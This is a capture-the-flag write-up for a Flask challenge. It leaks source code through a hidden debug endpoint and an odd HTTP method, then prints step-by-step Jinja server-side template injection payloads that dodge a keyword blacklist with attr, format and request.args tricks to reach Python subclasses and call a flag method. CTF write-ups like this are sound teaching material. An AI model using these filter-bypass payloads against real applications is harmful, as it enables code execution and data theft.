## Solution

1.  Looking at the source code of main page you can find `/debug_it` endpoint.
 
![Html source code](images/1.png)

2. When you try to access it you may see `Wrong method` information. To check how to access this endpoint, simply use `OPTIONS` HTTP request type.


![OPTIONS response](images/2.png)

3. After using `DEBUG` request type, you get the access to a part of source code of application. Part that interests us is here:
```python
ip_unsanitized = request.args.get('ip') or None
if ip_unsanitized is None:
    return abort(400, 'No ip parameter')
else:
    ip = sanitize(ip_unsanitized)
    location = get_location_for(ip)
    try:
        template = render_template_string(render_template('results.html', ip=ip, location=location))
        return template
    except Exception as e:
        logging.error(e)
        abort(500)
```
We can see here that saintized IP is passed directly to the HTML

4. We need to bypass saintization:
```python
blacklist = ["__class__", "__subclasses__", "request[request.", "__", "|join", '[', ']' ]
for bad in blacklist:
    if bad in string:
        abort(400, f"No hacking here - { bad } is not allowed") 
```

5. We will use Jinja templates. Usefull Jinja/python code:
   
- `__class__` - access working class
- `__mro__` - access classe's parents
- `__subclasses__` - access classe's sublclasses

6. Ideally we will use something like:
```jinja
{{request.__class__.__mro__[11].__subclasses__()[483].get__flag()}}
```

We access Request class, then Object and get it's all subclasses (our Flag class derives from it). If we look into it using `__dict__` we can see `get__flag()` method. Just use it 

> 483 is just temporary value - it may vary depending on running python version

Unfortunately we need to bypass sanitization

### Bypassing

- We can use `format` and `attr`:
```jinja
{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```
This string bypasses `__`, `__class__` and `|join`. It uses syntax similar to URL query params

- Now we need to bypass `[` `]` sanitization and access `__mro__[11]` (we cannot use direct array access):
```jinja
{%set%20a,b,c,d,e,f,g,h,i,j,k,l%20=%20(request|attr(request.args.class|format(request.args.a,request.args.a,request.args.a,request.args.a))|attr(request.args.mro|format(request.args.a,request.args.a,request.args.a,request.args.a)))%}{{l}}&class=%s%sclass%s%s&a=_&mro=%s%smro%s%s
```
We can just access 11th created element `l`

- Now is the time for `__subclasses__`:
```jinja
{%set%20a,b,c,d,e,f,g,h,i,j,k,l%20=%20(request|attr(request.args.class|format(request.args.a,request.args.a,request.args.a,request.args.a))|attr(request.args.mro|format(request.args.a,request.args.a,request.args.a,request.args.a)))%}{{(l|attr(request.args.subclasses|format(request.args.a,request.args.a,request.args.a,request.args.a))())}}&class=%s%sclass%s%s&a=_&mro=%s%smro%s%s&subclasses=%s%ssubclasses%s%s
```
We use similar method as before (a lot of query params and formats)

- If we have our subclasses we need to access its 500th element (or something around it). We do not want to create over 500 variables so we will use `pop()`:
```jinja
{%set%20a,b,c,d,e,f,g,h,i,j,k,l%20=%20(request|attr(request.args.class|format(request.args.a,request.args.a,request.args.a,request.args.a))|attr(request.args.mro|format(request.args.a,request.args.a,request.args.a,request.args.a)))%}{{(l|attr(request.args.subclasses|format(request.args.a,request.args.a,request.args.a,request.args.a))()).pop(500)}}&class=%s%sclass%s%s&a=_&mro=%s%smro%s%s&subclasses=%s%ssubclasses%s%s
```

- When we have our `Flag` class we want to look into it's methods - we use `__dict__`:
```jinja
{%set%20a,b,c,d,e,f,g,h,i,j,k,l%20=%20(request|attr(request.args.class|format(request.args.a,request.args.a,request.args.a,request.args.a))|attr(request.args.mro|format(request.args.a,request.args.a,request.args.a,request.args.a)))%}{{(l|attr(request.args.subclasses|format(request.args.a,request.args.a,request.args.a,request.args.a))()).pop(597)|attr(request.args.dict|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&class=%s%sclass%s%s&a=_&mro=%s%smro%s%s&subclasses=%s%ssubclasses%s%s&dict=%s%sdict%s%s
```

![dict response](images/5.png)

- We can see `get_____flag()` method:
```jinja
{%set%20a,b,c,d,e,f,g,h,i,j,k,l%20=%20(request|attr(request.args.class|format(request.args.a,request.args.a,request.args.a,request.args.a))|attr(request.args.mro|format(request.args.a,request.args.a,request.args.a,request.args.a)))%}{{(l|attr(request.args.subclasses|format(request.args.a,request.args.a,request.args.a,request.args.a))()).pop(597)|attr(request.args.getflag|format(request.args.a,request.args.a,request.args.a,request.args.a,request.args.a))()}}&class=%s%sclass%s%s&a=_&mro=%s%smro%s%s&subclasses=%s%ssubclasses%s%s&getflag=get%s%s%s%s%sflag
```


![Result](images/4.png)